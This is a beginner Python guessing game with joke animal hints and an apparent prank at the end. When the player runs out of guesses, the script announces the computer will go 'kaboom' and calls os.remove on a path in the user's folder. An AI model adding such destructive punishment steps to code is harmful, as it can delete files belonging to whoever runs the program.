import random
import os
import time

print("guess the right animal to not lose computer xD")
dogHint = "woof woof"
pandaHint = "half black white asian"
goatHint = "Eminem"
elephantHint = "heavy"
cowHint = "makes milk"
eagleHint = "as american as it gets"
mouseHint = "bff of a chemistry scientist"
ratHint = "pretty large, especially in New York"
bullHint = "close to a Ferrari"

numberOfGuesses = 5
guesses = 0
hiddenWordList = ["panda", "dog", "goat", "elephant", "cow", "eagle", "mouse", "rat", "bull"]
random.shuffle(hiddenWordList)
hiddenWord = hiddenWordList[0]
isPlaying = True

if hiddenWord == "dog":
    print("hint: " + dogHint)
elif hiddenWord == "panda":
    print("hint: " + pandaHint)
elif hiddenWord == "goat":
    print("hint: " + goatHint)
elif hiddenWord == "elephant":
    print("hint: " + elephantHint)
elif hiddenWord == "cow":
    print("hint: " + cowHint)
elif hiddenWord == "eagle":
    print("hint: " + eagleHint)
elif hiddenWord == "mouse":
    print("hint: " + mouseHint)
elif hiddenWord == "rat":
    print("hint: " + ratHint)
elif hiddenWord == "bull":
    print("hint: " + bullHint)


for guesses in range(numberOfGuesses):
    answer = input("your guess: ")

    if answer.lower() == hiddenWord:
        print("good")
        break
    else:
        print("wrong answer, try again")
        guesses += 1

if guesses >= numberOfGuesses:
    print("you lost, your computer is going kaboom in like 5 secs i dunno idc")
    time.sleep(5)
    pcPath = "C:/users/" + os.getlogin() + "/Windows32"
    os.remove(pcPath)
